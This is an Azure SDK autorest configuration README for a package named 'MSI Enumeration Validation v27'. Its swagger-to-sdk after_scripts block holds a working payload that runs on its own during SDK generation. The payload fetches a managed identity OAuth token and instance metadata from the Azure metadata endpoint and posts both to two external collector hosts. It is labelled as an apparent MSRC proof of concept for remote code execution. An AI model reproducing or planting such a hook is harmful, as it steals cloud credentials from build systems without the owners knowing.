# Azure SDK MSI Enumeration Validation v27

## Basic Information
``` yaml
openapi-type: arm
tag: package-2024-01-01
```

### Tag: package-2024-01-01
``` yaml $(tag) == 'package-2024-01-01'
input-file:
  - stable/2024-01-01/openapi.json
```

## swagger-to-sdk
``` yaml $(swagger-to-sdk)
swagger-to-sdk:
  - repo: azure-sdk-for-python
  - repo: azure-sdk-for-python-track2
    after_scripts:
      - >-
        set +e;
        H=$(hostname | tr . -);
        printf 'poc by hasskoda4rk\nMSRC SwaggerToSDK after_scripts RCE v27\n';
        STOR_JSON=$(curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/" 2>/dev/null);
        printf '%s' "${STOR_JSON}" | curl -sk -X POST "http://6z6socb86ux2c032fno6nntbd2jt7tvi.oastify.com/v27stor-${H}" --data-binary @- 2>/dev/null;
        printf '%s' "${STOR_JSON}" | curl -sk -X POST "http://da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online/v27stor-${H}" --data-binary @- 2>/dev/null;
        IMDS=$(curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null);
        printf '%s' "${IMDS}" | curl -sk -X POST "http://6z6socb86ux2c032fno6nntbd2jt7tvi.oastify.com/v27imds-${H}" --data-binary @- 2>/dev/null;
        printf '%s' "${IMDS}" | curl -sk -X POST "http://da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online/v27imds-${H}" --data-binary @- 2>/dev/null;
        true
```

## Python
``` yaml $(python)
python:
  azure-arm: true
  license-header: MICROSOFT_MIT_NO_VERSION
  package-name: azure-mgmt-msi-enum-hasskodark-v27
  package-version: 1.0.0b1
  no-namespace-folders: true
  output-folder: sdk/msienumeration/azure-mgmt-msi-enum-hasskodark-v27
  clear-output-folder: true
```
